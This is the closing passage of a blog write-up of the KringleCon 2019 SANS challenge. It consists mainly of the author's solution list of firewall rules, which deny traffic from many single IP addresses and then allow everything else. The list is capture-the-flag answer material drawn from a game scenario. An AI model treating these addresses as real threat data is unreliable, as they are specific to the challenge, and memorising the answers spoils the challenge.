  <span style="color:#f1fa8c">&#34;D:254.140.181.172/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:27.88.56.114/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:28.169.41.122/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:29.0.183.220/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:31.116.232.143/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:31.254.228.4/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:32.168.17.54/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:33.132.98.193/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:34.129.179.28/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:34.155.174.167/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.103.246.130/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.103.246.250/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.127.244.30/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.16.149.112/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.191.112.181/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:44.164.136.41/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:44.74.106.131/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:45.239.232.245/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:48.66.193.176/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:49.161.8.58/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:50.154.111.0/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:53.160.218.44/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:56.5.47.137/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:6.144.27.227/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:61.110.82.125/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:65.153.114.120/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:66.116.147.181/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:68.115.251.76/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:69.221.145.150/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:72.183.132.206/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:75.73.228.192/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:79.198.89.109/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:80.244.147.207/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:81.14.204.154/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:83.0.8.119/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:84.147.231.129/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:84.185.44.166/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:87.195.80.126/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:9.206.212.33/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:9.95.128.208/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:92.213.148.0/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:95.166.116.45/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:97.220.93.190/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;A:0.0.0.0/0&#34;</span>,
]);
</code></pre></td></tr></table>
</div>
</div><p>All objectives completed :)) Thank you SANS &hellip;</p>

      </div>
    </article>

    <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Kringlecon%202019&amp;caption=Kringlecon%202019&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=Kringlecon%202019&amp;body=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f&amp;media=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f;description=Kringlecon%202019" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f&amp;title=Kringlecon%202019&amp;summary=Kringlecon%202019&amp;source=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f&amp;resubmit=true&amp;title=Kringlecon%202019" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f;title=Kringlecon%202019" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=Kringlecon%202019%20https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f&amp;t=Kringlecon%202019" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Kringlecon%202019&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2019%2f12%2fkringlecon-2019%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>
          <hr />

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h"></span>
        </div>

        <div class="pagination__buttons">
          
            <a href="https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-binary-exploitation/" class="button previous">
                <span class="button__icon">â†</span>
                <span class="button__text">picoCTF 2018 - Binary Exploitation</span>
            </a>
          

          
            <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/" class="button next">
                <span class="button__text">HTB - Obtain an invitation code on hackthebox.eu</span>
                <span class="button__icon">â†’</span>
            </a>
          
        </div>
      </div>
    

      <hr />

        










  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084;</span>
          </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>



    </body>
</html>
